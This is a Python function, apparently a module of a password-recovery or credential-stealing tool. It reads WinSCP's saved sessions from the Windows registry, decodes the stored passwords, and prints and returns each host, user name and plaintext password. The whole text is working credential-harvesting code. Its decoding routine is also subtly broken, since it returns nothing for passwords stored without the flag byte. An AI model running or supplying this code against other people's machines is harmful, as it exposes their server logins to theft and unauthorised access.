def get_winscp():
    data = []
    import winreg
    PWALG_SIMPLE = 1
    PWALG_SIMPLE_MAGIC = 0xA3
    PWALG_SIMPLE_STRING = "0123456789ABCDEF"
    PWALG_SIMPLE_MAXLEN = 50
    PWALG_SIMPLE_FLAG = 0xFF

    def SimpleDecryptNextChar(password):
        from ctypes import c_uint8 as unsigned_byte
        signed_flag = ~((((PWALG_SIMPLE_STRING.find(password[0])) << 4) + ((PWALG_SIMPLE_STRING.find(password[1])))) ^ PWALG_SIMPLE_MAGIC)
        unsigned_flag = unsigned_byte(signed_flag).value
        return password[2:], unsigned_flag

    def decryptPassword(Password, key):
        result = ''
        Password, flag = SimpleDecryptNextChar(Password)
        if flag == PWALG_SIMPLE_FLAG:
            Password, dummy = SimpleDecryptNextChar(Password)
            Password, length = SimpleDecryptNextChar(Password)
        else:
            length = flag
        Password, empty = SimpleDecryptNextChar(Password)
        Password = Password[empty * 2:]
        for i in range(length):
            Password, output = SimpleDecryptNextChar(Password)
            result += str(chr(output))

        if flag == PWALG_SIMPLE_FLAG:
            if result[0:len(key)] != key:
                result = ""
            else:
                result = result[len(key):]
            return result

    try:
        aReg = winreg.ConnectRegistry(None, winreg.HKEY_CURRENT_USER)
        baseKeyStr = r'SOFTWARE\Martin Prikryl\WinSCP 2\Sessions'
        baseKey = winreg.OpenKey(aReg, r'SOFTWARE\Martin Prikryl\WinSCP 2\Sessions')
        sessions = []
        for i in range(1024):
            try:
                keynames = winreg.EnumKey(baseKey, i)
                sessions.append(keynames)
            except:
                pass
    except:
        return
    print('WinSCP:\n-----------------------------')
    for session in sessions:
        password, username, hostname = '', '', ''
        try:
            key = baseKeyStr + '\\' + session
            sesKey = winreg.OpenKey(aReg, key)
            for index in range(10):
                try:
                    name, value, Type = winreg.EnumValue(sesKey, index)
                    if name == 'HostName':
                        hostname = value
                    elif name == 'Password':
                        password = value
                    elif name == 'UserName':
                        username = value
                except:
                    pass
            if password and username and hostname:
                print(f'Host: {hostname}\nUsername: {username}\nPassword: {decryptPassword(password, username + hostname)}\n')
                data.append({"host": hostname, "username": username, "password": decryptPassword(password, username + hostname)})
        except:
            pass
    return data



